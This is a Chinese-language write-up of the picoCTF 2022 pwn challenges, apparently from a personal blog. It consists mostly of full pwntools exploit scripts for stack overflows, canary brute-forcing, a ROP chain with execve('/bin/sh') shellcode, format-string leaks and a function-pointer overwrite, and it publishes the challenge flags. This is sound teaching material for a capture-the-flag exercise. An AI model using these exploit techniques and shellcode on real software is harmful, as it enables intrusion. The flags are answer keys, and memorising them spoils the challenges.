---
layout: post
title: Picoctf_2022 Write-Up
subheading: JUST PWN
author: dayfly
categories: wp
banner:
  video: null
  loop: true
  volume: 0.8
  start_at: 8.5
  image: https://images.pexels.com/photos/1673973/pexels-photo-1673973.jpeg
  opacity: 0.618
  background: "#000"
  height: "100vh"
  min_height: "38vh"
  heading_style: "font-size: 5em; font-weight: bold; text-decoration: none; min-width: 1100px"
  subheading_style: "color: gold"
tags: [pwn, stack overflow, fmt, rop]
# sidebar: []
---

## basic-file-exploit

### 思路

先选`1`随便写入几个数据，满足`inputs != 0`的要求
```c
if (inputs == 0) {
  puts("No data yet");
  continue;
}
```

然后选`2`输入不含数字的字符串满足以下要求，即可拿到`flag`
```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
  puts(flag);
  fseek(stdin, 0, SEEK_END);
  exit(0);
}
```

### 题解过程
```
  Hi, welcome to my echo chamber!
  Type '1' to enter a phrase into our database
  Type '2' to echo a phrase in our database
  Type '3' to exit the program

  No data given.
  Please put in a valid number
  1
  1
  Please enter your data:
  1234
  1234
  Please enter the length of your data:
  2
  2
  Your entry number is: 1
  Write successful, would you like to do anything else?
  2
  2
  Please enter the entry number of your data:
  ewaeawe
  ewaeawe
  picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_00AAD6B3}
```

## buffer overflow 0

### 思路

No canary，直接溢出触发segmentation fault既可。

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 55986)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

# trigger segmentation fault
sla('Input: ', b'b'*20)
print(rl())
```

## buffer overflow 1

### 思路

No canary，简单的溢出覆盖返回地址。

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 56929)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

sla('Please enter your string: \n', b'b'*(0x28+4)+p32(0x080491F6))
print(rl())
itr()
```

## buffer overflow 2

### 思路

类似于 buffer overflow 1，只不过加了一个参数传递的限制。

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 58214)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

sla(' string: \n', b'b'*(0x6c+4)+ p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D))
itr()
```

## buffer overflow 3

### 思路

canary长度为4，先爆破拿canary，然后再常规栈溢出就行了

```c
#define CANARY_SIZE 4
if (memcmp(canary,global_canary,CANARY_SIZE)) {
        printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
        exit(-1);
}
```

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 63235)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

st_l = []
for i in range(0x21, 0x7f):
        st_l.append(p8(i))

print(st_l) 
i = 0

size = 0x42
payload = b'b'*0x40

pre_pay = payload
payload += st_l[0]
j = 0

print(payload)

# test canary
# while True:
#         try:
#                 if argv[1] == 'r':
#                         p = remote('saturn.picoctf.net', 63235)
#                 else:
#                         p = process(binary)

#                 # p = process(binary)
#                 # p = remote('saturn.picoctf.net', 57461)
#                 sla('Buffer?\n> ', str(size))
#                 # sa('Input> ', b'b'*0x40+b'cana'+b'AAAA'+p64(0)+p32(0)+p32(0x08049336))
#                 sa('Input> ', payload)
#                 res = rl()
#                 print('res = ', res)
#                 if (str(res).find('Smashing') > 0):
#                         payload = pre_pay
#                         i = (i + 1) % len(st_l)
#                         payload += st_l[i]
#                 else:
#                         print(payload)
#                         size = size + 1
#                         i = 0
#                         pre_pay = payload
#                         payload += st_l[i]
#                         j = j + 1
#                         log.success('size = ' + hex(size))
#                         log.success('pre_pay = ' + str(pre_pay))
#                         log.success('j = ' + str(j))
#                         if (j == 4):
#                                 break

#         except Exception as e:
#                 p.close()


size = 0x60
payload = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'
payload += b'AAAA'+p64(0)+p32(0)+p32(0x08049336)

sla('Buffer?\n> ', str(size))
sa('Input> ', payload)
print(rl())
print(rl())
```

### Result

```
...
res =  b"Ok... Now Where's the Flag?\n"
b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'
[+] size = 0x46
[+] pre_pay = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbBiRd'
[+] j = 4
...
b'picoCTF{Stat1C_c4n4r13s_4R3_b4D_f7c1f50a}\n'
```

## x-sixty-what

### 思路

换成了x86_64程序，和buffer_overflow_1类似，no canary，直接溢出覆盖返回地址。

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 52865)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

ret = 0x40101a
sla('gets you the flag: \n', b'b'*0x48+p64(0x40101a)+p64(0x401236))
itr()
```

## wine

### 思路

换成了windows的栈溢出题，no canary

### EXP

```python
from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']

p = remote('saturn.picoctf.net', 65422)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

payload = b'b'*(0x88+4) + p32(0x401530)
sla('Give me a string!\r\n', payload)
print(rl())
itr()
```

## CVE-XXXX-XXXX

直接google搜Windows Print Spooler Service 2021 CVE，多试几个

## RPS

### 思路

连续5次猜赢石头剪刀布才会吐flag，用的笨方法爆破，大概10分钟左右。

### EXP

```python
from pwn import *
from sys import argv

# context.log_level = 'debug'
context.os = 'linux'
context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']

if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 52524)
else:
        p = process('./game')

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

loses = ["paper", "scissors", "rock"]
rint = [1, 1, 0, 0, 0]
count = 0

for i in rint:
        print(loses[i])

j = 0
i = rint[j]

while(1):
        sla("Type '1' to play a game", '1')
        sla('(rock/paper/scissors):', loses[i])
        j = (j + 1) % 5
        i = rint[j]
        
        rls(4)
        res = rl()
        print('res = ', res)
        if (str(res).find('You win!') > 0):
                count = count + 1
        else:
                count = 0

        print(count)

        if (count == 5):
                ru("Congrats, here's the flag!")
                print(rl())
                print(rl())
                print(rl())
                itr()
                break
```

### Result

```
...
res =  b"Seems like you didn't win this time. Play again?\r\n"
0
res =  b'You win! Play again?\r\n'
1
res =  b'You win! Play again?\r\n'
2
res =  b'You win! Play again?\r\n'
3
res =  b'You win! Play again?\r\n'
4
res =  b'You win! Play again?\r\n'
5
...
b'picoCTF{50M3_3X7R3M3_1UCK_32F730C2}\r\n'
...
real	9m10.276s
user	0m1.003s
sys	0m0.131s
```

## ropfu

### 思路

No canary，stack有执行权限，用mprotect赋予bss段可执行权限，然后往bss段写入shellcode并执行

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
elf = ELF(binary)
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 54462)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

# shellcode one
# sc = shellcraft.sh()
# sc = asm(sc)
# print(len(sc))

# shellcode two
# sc = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
# sc += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# print(len(sc))

# shellcode three
'''
execve('/bin/sh', 0, 0)
eax = 11, ebx -> '/bin/sh', ecx = edx = 0
'''
sc = ''
sc += 'xor ecx,ecx;'
sc += 'mul ecx;'
sc += 'push ecx;'
sc += 'push 0x68732f2f;'
sc += 'push 0x6e69622f;'
sc += 'mov ebx,esp;'
sc += 'mov al,11;'
sc += 'int 0x80'
sc = asm(sc)
print(len(sc))

bss = 0x080E6000
pop_edx_ebx_esi_ret = 0x0805f7b6

pay = b'b'*(0x18+4) + p32(elf.symbols['mprotect']) 
pay += p32(pop_edx_ebx_esi_ret) + p32(bss) + p32(0x100) + p32(0x7)
pay += p32(elf.symbols['read']) + p32(bss) + p32(0) + p32(bss) + p32(0x100)
print(pay)

sla('grasshopper!\n', pay)
sl(sc)
sl('cat flag.txt')
itr()
```

## flag leak

### 思路

scanf最多可以读入127个字符，利用printf格式化字符串漏洞泄露flag

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 64125)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

pay = b'%45$x---' + b'%44$x---' + b'%43$x---' + b'%42$x---'
pay += b'%41$x---' + b'%40$x---'+ b'%39$x---' + b'%38$x---'
pay += b'%37$x---' + b'%36$x---'+ b'a'*0x30 + b'0'*3
sla('you one >> ', pay)
print(rl())
print(rl())

# get flag, little endian
# 7b465443---6f636970---5f676e31---6b34334c---6666305f
# ---67346c46---655f6b63---3474535f---7d326136---34623962

str_li = ['7d326136', '34623962', '655f6b63','3474535f','6666305f'
          ,'67346c46','5f676e31','6b34334c','7b465443','6f636970']
print(chr(0x7d))

ch_l = ""
for v in str_li:
        for i in range(0, len(v), 2):
                ch = v[i] + v[i+1]
                ch_l += chr(int(ch, 16))
                print(ch_l)

ch_l = ch_l[::-1]
print(ch_l)
```
  
###  Result

```
...
b'7d326136---34623962---655f6b63---3474535f---6666305f
---67346c46---5f676e31---6b34334c---7b465443---6f636970
---aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
...
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{F
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FT
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTC
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCo
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCoc
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCoci
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCocip
picoCTF{L34k1ng_Fl4g_0ff_St4ck_eb9b46a2}
```

## function overwrite

### 思路

通过fun数组越界，覆盖check指针为easy_checker函数的地址，在拼凑数据使得能通过calculate_story_score函数的检查，既可收到flag。

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 52369)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

payload = str(97)*11 +str(9)+ str(0)
sla("if you're a 1337 >> ", payload)
ru("Keep the first one less than 10.\n")
sl(str(-16))
sl(str(-314))

print(rl())
print(rl())
```

## stack cache

### 思路

函数读取的数据，在函数退栈后，仍然会遗留在栈上。因此，函数退栈后，可以利用格式化字符泄漏这些栈上的关键数据

### EXP

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './vuln'
if argv[1] == 'r':
        p = remote('saturn.picoctf.net', 51157)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

ret = 0x0804900e
payload = b'b'*(0xa) + b'cccc' + p32(0x08049DA0) + p32(0x08049E20)
sla('gets you the flag\n', payload)
print(rls(4))

# b'User information : 0x80c9a04 0x804007d 0x61333337 0x31646239 0x5f597230 0x6d334d5f', 
# b'Names of user: 0x50755f4e 0x34656c43 0x7b465443', 
# b'Age of user: 0x6f636970'

# little endian
str_li = ['7d', '61333337','31646239','5f597230','6d334d5f','50755f4e','34656c43','7b465443','6f636970']
print(chr(0x7d))

ch_l = ""
for v in str_li:
        for i in range(0, len(v), 2):
                ch = v[i] + v[i+1]
                ch_l += chr(int(ch, 16))
                print(ch_l)

ch_l = ch_l[::-1]
print(ch_l)
```

### Result
```
...
b'User information : 0x80c9a04 0x804007d 0x61333337 0x31646239 0x5f597230 0x6d334d5f\n'
b'Names of user: 0x50755f4e 0x34656c43 0x7b465443\n'
b'Age of user: 0x6f636970\n'
...
}a3371db9_Yr0m3M_Pu_N4elC{FTC
}a3371db9_Yr0m3M_Pu_N4elC{FTCo
}a3371db9_Yr0m3M_Pu_N4elC{FTCoc
}a3371db9_Yr0m3M_Pu_N4elC{FTCoci
}a3371db9_Yr0m3M_Pu_N4elC{FTCocip
picoCTF{Cle4N_uP_M3m0rY_9bd1733a}
```

## Reference

- [Stack Overflow][1]
- [Basic Rop][2]
- [Format String][3]


  [1]: https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/
  [2]: https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/
  [3]: https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/